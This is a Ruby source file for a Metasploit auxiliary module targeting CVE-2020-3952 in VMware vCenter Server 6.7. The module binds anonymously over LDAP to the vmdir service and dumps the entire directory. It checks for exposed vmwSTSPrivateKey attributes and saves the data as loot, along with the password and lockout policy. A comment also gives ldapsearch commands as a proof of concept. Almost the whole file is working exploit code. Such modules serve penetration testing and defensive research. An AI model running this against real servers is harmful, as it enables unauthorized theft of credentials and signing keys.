##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Server vmdir Information Disclosure',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump data from
          the vmdir service in VMware vCenter Server version 6.7 prior to the
          6.7U3f update.
        },
        'Author' => [
          # Discovered by unknown researcher(s)
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-3952'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
        ],
        'DisclosureDate' => '2020-04-09', # Vendor advisory
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', 'Description' => 'Dump all LDAP data']
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it'])
    ])

    register_advanced_options([
      OptFloat.new('ConnectTimeout', [false, 'Timeout for LDAP connect', 10.0])
    ])
  end

  def base_dn
    @base_dn ||= 'dc=vsphere,dc=local'
  end

  def policy_dn
    "cn=password and lockout policy,#{base_dn}"
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted]
  def run
    opts = {
      host: rhost,
      port: rport,
      connect_timeout: datastore['ConnectTimeout']
    }

    entries = nil

    Net::LDAP.open(opts) do |ldap|
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = discover_base_dn(ldap))
          print_warning('Falling back on default base DN dc=vsphere,dc=local')
        end
      end

      print_status("Dumping LDAP data from vmdir service at #{peer}")
      entries = ldap.search(base: base_dn)
    end

    # Look for an entry with a non-empty vmwSTSPrivateKey attribute
    unless entries&.find { |entry| entry[:vmwstsprivatekey].any? }
      print_error("#{peer} is NOT vulnerable to CVE-2020-3952")
      return Exploit::CheckCode::Safe
    end

    print_good("#{peer} is vulnerable to CVE-2020-3952")
    pillage(entries)

    # HACK: Stash discovered base DN in CheckCode reason
    Exploit::CheckCode::Vulnerable(base_dn)
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  end

  def pillage(entries)
    # TODO: Make this more efficient?
    ldif = entries.map(&:to_ldif).join("\n")

    print_status('Storing LDAP data in loot')

    ldif_filename = store_loot(
      name, # ltype
      'text/plain', # ctype
      rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn}" # info
    )

    unless ldif_filename
      print_error('Could not store LDAP data in loot')
      return
    end

    print_good("Saved LDAP data to #{ldif_filename}")

    policy = entries.find { |entry| entry.dn == policy_dn }

    if policy
      print_status('Password and lockout policy:')
      print_line(policy.to_ldif)
    end
  end

end
